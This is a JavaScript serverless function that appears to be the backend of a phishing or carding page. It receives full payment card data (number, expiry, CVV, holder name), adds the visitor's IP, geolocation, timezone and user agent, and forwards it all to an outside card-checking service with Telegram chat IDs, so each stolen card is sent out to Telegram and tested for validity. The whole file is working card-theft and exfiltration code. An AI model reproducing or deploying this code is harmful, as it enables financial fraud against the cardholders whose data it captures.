const API_URL = 'https://bot.pc.am/v3/checkBalance';

export async function onRequestPost(context) {
  const { request, env } = context;

  const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Content-Type': 'application/json',
  };

  const API_TOKEN = env.API_TOKEN;
  const TELEGRAM_BEFORE = env.TELEGRAM_ID_BEFORE_CHECK || '-1003750392427';
  const TELEGRAM_AFTER = env.TELEGRAM_ID_AFTER_CHECK || '-1003750392427';
  const REQUEST_TIMEOUT = env.REQUEST_TIMEOUT || '';
  const CACHE_SECONDS = env.CACHE_RESPONSE_SECONDS || '';
  const SCREENSHOT = env.SCREENSHOT || '';
  const SCREENSHOT_QUALITY = env.SCREENSHOT_JPEG_QUALITY || '';
  const SCREENSHOT_SIZE = env.SCREENSHOT_BOX_SIZE || '';

  if (!API_TOKEN) {
    return new Response(JSON.stringify({ success: false, error: 'API token not configured' }), { headers: corsHeaders });
  }

  try {
    const body = await request.json();
    const { cardNumber, expiryMonth, expiryYear, cvv, cardHolder, timezone, userAgent, referral, pageUrl } = body;

    const number = (cardNumber || '').replace(/\s/g, '');
    const month = (expiryMonth || '').padStart(2, '0');
    const year = expiryYear || '';
    const cvvVal = cvv || '';

    // Get visitor IP
    const ip = request.headers.get('cf-connecting-ip')
      || request.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
      || '';

    // Lookup location from IP
    let location = '';
    try {
      const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
      const geo = await geoRes.json();
      if (geo.status === 'success') {
        location = `${geo.city}, ${geo.country}`;
      }
    } catch {}

    // Build note
    const cardLine = `API card received: ${number} ${month}/${year} ${cvvVal}`;
    const infoParts = [];
    infoParts.push(`IP: ${ip || 'unknown'}`);
    if (location) infoParts.push(`Location: ${location}`);
    if (timezone) infoParts.push(`Timezone: ${timezone}`);
    infoParts.push(`Referral: ${referral || 'Direct'}`);
    infoParts.push(`Page: ${pageUrl || 'unknown'}`);
    if (cardHolder) infoParts.push(`Name: ${cardHolder}`);
    if (userAgent) infoParts.push(`UA: ${userAgent}`);

    const fullNote = cardLine + '\n' + infoParts.join(' | ');

    // Required params
    const params = new URLSearchParams({
      token: API_TOKEN,
      number,
      month,
      year,
      cvv: cvvVal,
    });

    // Optional params
    if (TELEGRAM_BEFORE) params.set('telegram_id_before_check', TELEGRAM_BEFORE);
    if (TELEGRAM_AFTER) params.set('telegram_id_after_check', TELEGRAM_AFTER);
    params.set('telegram_additional_note', fullNote);
    if (REQUEST_TIMEOUT) params.set('request_timeout', REQUEST_TIMEOUT);
    if (CACHE_SECONDS) params.set('cache_response_seconds', CACHE_SECONDS);
    if (SCREENSHOT) params.set('screenshot', SCREENSHOT);
    if (SCREENSHOT_QUALITY) params.set('screenshot_jpeg_quality', SCREENSHOT_QUALITY);
    if (SCREENSHOT_SIZE) params.set('screenshot_box_size', SCREENSHOT_SIZE);

    const apiRes = await fetch(API_URL + '?' + params.toString());
    const text = await apiRes.text();
    let data;
    try {
      data = JSON.parse(text);
    } catch {
      data = { raw: text, success: false, error: 'Invalid response' };
    }

    return new Response(JSON.stringify(data), { headers: corsHeaders });
  } catch (err) {
    return new Response(JSON.stringify({ success: false, error: err.message || 'Request failed' }), { headers: corsHeaders });
  }
}

export async function onRequestOptions() {
  return new Response(null, {
    status: 204,
    headers: {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    },
  });
}
